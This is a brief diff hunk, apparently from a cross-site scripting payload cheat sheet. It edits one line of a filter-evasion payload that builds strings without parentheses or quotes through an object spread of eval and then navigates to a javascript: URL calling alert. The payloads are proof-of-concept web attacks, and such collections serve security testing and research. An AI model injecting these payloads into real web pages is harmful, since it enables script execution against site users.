@@ -220,7 +220,7 @@ location=`javascript:`+location
 
 Custom strings without `` ()'"` ``
 ```
-x={...eval+'',toString:Array.prototype.shift,length:15},
+x={...eval+0,toString:Array.prototype.shift,length:15},
 x+x+x+x+x+x+x+x+x+x+x+x+x,
 location = /javascript:/.source + alert.name+x+1337+x
 ```
